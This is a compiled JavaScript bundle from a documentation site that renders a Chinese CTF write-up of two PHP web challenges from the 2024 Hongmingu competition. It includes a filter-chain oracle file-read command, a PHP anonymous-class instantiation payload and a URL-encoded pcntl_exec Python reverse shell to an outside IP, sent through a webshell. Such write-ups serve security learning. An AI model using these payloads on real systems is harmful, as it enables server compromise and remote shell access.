"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[5697],{8453:(e,n,c)=>{c.d(n,{R:()=>l,x:()=>t});var s=c(6540);const r={},i=s.createContext(r);function l(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),s.createElement(i.Provider,{value:n},e.children)}},9380:(e,n,c)=>{c.r(n),c.d(n,{assets:()=>d,contentTitle:()=>t,default:()=>o,frontMatter:()=>l,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"CTF/Misc/2024\u7ea2\u660e\u8c37","title":"2024\u7ea2\u660e\u8c37","description":"SOLVED Later","source":"@site/docs/CTF/Misc/2024\u7ea2\u660e\u8c37.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/2024\u7ea2\u660e\u8c37","permalink":"/docs/CTF/Misc/2024\u7ea2\u660e\u8c37","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/2024\u7ea2\u660e\u8c37.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"2024\u5f3a\u7f51\u590d\u73b0","permalink":"/docs/CTF/Misc/2024\u5f3a\u7f51\u590d\u73b0"},"next":{"title":"NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a","permalink":"/docs/CTF/Misc/NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a"}}');var r=c(4848),i=c(8453);const l={},t=void 0,d={},a=[{value:"SOLVED Later",id:"solved-later",level:2},{value:"unauth",id:"unauth",level:2}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h2,{id:"solved-later",children:"SOLVED Later"}),"\n",(0,r.jsx)(n.p,{children:"\u6e90\u7801(php\u7248\u672c\u662f8.3.2)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\n// flag.php\r\nif (isset($_POST['f'])) {\r\n    echo hash_file('md5', $_POST['f']);\r\n}\r\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"hash_file\u51fd\u6570\uff0c\u7528filters_chain_oracle_exploit.py\u4fa7\u4fe1\u9053\u8bfb\u53d6\u6587\u4ef6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:'python filters_chain_oracle_exploit.py --target http://192.168.56.101:1238/ --file flag.php --parameter f --time_based_attack True --match "Allowed memory size of"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"flag.php"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\r\nif (isset($_GET['ezphpPhp8'])) {\r\n    highlight_file(__FILE__);\r\n} else {\r\n    die(\"No\");\r\n}\r\n$a = new class {\r\n    function __construct()\r\n    {\r\n    }\r\n\r\n    function getflag()\r\n    {\r\n        system('cat /flag');\r\n    }\r\n};\r\nunset($a);\r\n$a = $_GET['ezphpPhp8'];\r\n$f = new $a();\r\n$f->getflag();\r\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u9500\u6bc1\u4e86\u8fd9\u4e2a\u533f\u540d\u7c7b\uff0c\u6211\u4eec\u5728\u521b\u5efa\u4e00\u4e2a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"class@anonymous%00/var/www/html/flag.php:7$0\n"})}),"\n",(0,r.jsx)(n.p,{children:"payload"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53c2\u8003"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://mp.weixin.qq.com/s?__biz=MzU2NDY2OTU4Nw==&mid=2247510427&idx=1&sn=22a75d12cae57aed2fe3b1e4a909fb2e&scene=21#wechat_redirect",children:"https://mp.weixin.qq.com/s/gNi3ElOcD4qbCrYx6QJZdg"}),"?"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://hi-arkin.com/archives/php-anonymous-stdClass.html",children:"https://hi-arkin.com/archives/php-anonymous-stdClass.html"})}),"\n",(0,r.jsx)(n.h2,{id:"unauth",children:"unauth"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"http://www.zip%E4%B8%AD%E6%9C%89admin%E7%9A%84%E5%AF%86%E7%A0%81",children:"www.zip\u4e2d\u6709admin\u7684\u5bc6\u7801"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240405151327271.png",alt:"image-20240405151327271"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"2e525e29e465f45d8d7c56319fe73036\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u767b\u5f55\u540e\uff0c\u5b58\u5728\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u5bc6\u7801\u4e3acmd\uff0cban\u4e86\u5f88\u591a\u51fd\u6570\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u53ef\u4ee5\u7528pcntl_exec\u53cd\u5f39shell\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"/?cmd=%70%63%6e%74%6c%5f%65%78%65%63%28%22%2f%75%73%72%2f%62%69%6e%2f%70%79%74%68%6f%6e%22%2c%61%72%72%61%79%28%27%2d%63%27%2c%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%2c%73%6f%63%6b%65%74%2e%53%4f%4c%5f%54%43%50%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%2e%31%2e%31%2e%31%22%2c%32%39%39%39%39%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%62%61%73%68%22%2c%22%2d%69%22%5d%29%3b%27%29%29%3b\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7cfb\u7edf\u7684admin\u7528\u6237\u5bc6\u7801\u4e3ab90e0086d8b1165403de6974c4167165\uff08\u5728config.inc.php\u4e2d\uff09\uff0c\u5148\u7528python\u6216\u8005script\u83b7\u53d6\u4e00\u4e0b\u53ef\u4ea4\u4e92\u5f0fshell\uff0c\u518d\u7528su\u767b\u5f55\u4e00\u4e0badmin\u7528\u6237\u8bfbflag\u5373\u53ef"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"pcntl_exec -- \u5728\u5f53\u524d\u8fdb\u7a0b\u7a7a\u95f4\u6267\u884c\u6307\u5b9a\u7a0b\u5e8f"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"pcntl_exec"}),"(string ",(0,r.jsx)(n.code,{children:"$path"}),", array ",(0,r.jsx)(n.code,{children:"$args"})," = [], array ",(0,r.jsx)(n.code,{children:"$env_vars"})," = []): bool"]}),"\n"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"path"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"path"})," \u5fc5\u987b\u65f6\u53ef\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u8def\u5f84\u6216\u4e00\u4e2a\u5728\u6587\u4ef6\u7b2c\u4e00\u884c\u6307\u5b9a\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\u6807\u5934\u7684\u811a\u672c\uff08\u6bd4\u5982\u6587\u4ef6\u7b2c\u4e00\u884c\u662f #!/usr/local/bin/perl \u7684 perl \u811a\u672c\uff09\u3002"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"args"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"args"})," \u662f\u4e00\u4e2a\u8981\u4f20\u9012\u7ed9\u7a0b\u5e8f\u7684\u53c2\u6570\u7684\u5b57\u7b26\u4e32\u6570\u7ec4\u3002"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"env_vars"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"env_vars"})," \u662f\u4e00\u4e2a\u8981\u4f20\u9012\u7ed9\u7a0b\u5e8f\u4f5c\u4e3a\u73af\u5883\u53d8\u91cf\u7684\u5b57\u7b26\u4e32\u6570\u7ec4\u3002\u8fd9\u4e2a\u6570\u7ec4\u662fkey => value \u683c\u5f0f\u7684\uff0ckey \u4ee3\u8868\u8981\u4f20\u9012\u7684\u73af\u5883\u53d8\u91cf\u7684\u540d\u79f0\uff0cvalue \u4ee3\u8868\u8be5\u73af\u5883\u53d8\u91cf\u503c\u3002"]}),"\n"]}),"\n"]}),"\n"]})]})}function o(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}}}]);